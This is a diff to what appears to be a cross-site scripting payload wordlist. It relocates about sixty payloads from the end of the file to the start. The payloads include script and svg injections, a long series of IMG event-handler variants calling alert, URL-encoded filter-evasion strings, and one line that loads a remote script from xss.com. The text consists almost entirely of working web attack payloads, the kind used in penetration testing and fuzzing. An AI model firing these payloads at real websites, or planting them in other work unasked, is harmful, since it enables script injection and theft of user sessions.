@@ -1,3 +1,67 @@
+"><script>alert(1)</script>
+' onmouseover=alert(9204) bad='
+"><svg/onload=prompt(0)>
+"onresize=prompt(0)>
+<svg/onload=prompt(0) 
+<svg><script>prompt&#39;1)<b>
+<svg><script>prompt&#39;1)</script>
+'%21--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+<<scr\-1ipt/src=http://xss.com/xss.js></script
+%252Cscript%253Ealert('XSS')%253C%252Fscript%253E
+<IMG SRC=x onload="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onafterprint="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onbeforeprint="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onbeforeunload="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onerror="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onhashchange="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onmessage="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ononline="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onoffline="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onpagehide="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onpageshow="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onpopstate="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onresize="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onstorage="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onunload="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onblur="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onchange="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oncontextmenu="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oninput="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oninvalid="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onreset="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onsearch="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onselect="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onsubmit="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onkeydown="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onkeypress="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onkeyup="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onclick="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondblclick="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onmousedown="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onmousemove="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onmouseout="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onmouseover="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onmouseup="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onmousewheel="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onwheel="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondrag="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondragend="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondragenter="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondragleave="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondragover="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondragstart="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondrop="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onscroll="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oncopy="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oncut="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onpaste="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onabort="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oncanplay="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x oncuechange="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x ondurationchange="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onemptied="alert(String.fromCharCode(87,83,83))">
+<IMG SRC=x onended="alert(String.fromCharCode(87,83,83))">
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
@@ -6657,66 +6721,3 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 <"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></
 '%22()%26%25<><ScRiPt%20>alert(1)</ScRiPt>
-' onmouseover=alert(9204) bad='
-"><svg/onload=prompt(0)>
-"onresize=prompt(0)>
-<svg/onload=prompt(0) 
-<svg><script>prompt&#39;1)<b>
-<svg><script>prompt&#39;1)</script>
-'%21--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
-<<scr\-1ipt/src=http://xss.com/xss.js></script
-%252Cscript%253Ealert('XSS')%253C%252Fscript%253E
-<IMG SRC=x onload="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onafterprint="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onbeforeprint="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onbeforeunload="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onerror="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onhashchange="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onmessage="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ononline="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onoffline="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onpagehide="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onpageshow="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onpopstate="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onresize="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onstorage="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onunload="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onblur="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onchange="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oncontextmenu="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oninput="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oninvalid="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onreset="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onsearch="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onselect="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onsubmit="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onkeydown="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onkeypress="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onkeyup="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onclick="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondblclick="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onmousedown="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onmousemove="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onmouseout="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onmouseover="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onmouseup="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onmousewheel="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onwheel="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondrag="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondragend="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondragenter="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondragleave="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondragover="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondragstart="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondrop="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onscroll="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oncopy="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oncut="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onpaste="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onabort="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oncanplay="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x oncuechange="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x ondurationchange="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onemptied="alert(String.fromCharCode(87,83,83))">
-<IMG SRC=x onended="alert(String.fromCharCode(87,83,83))">
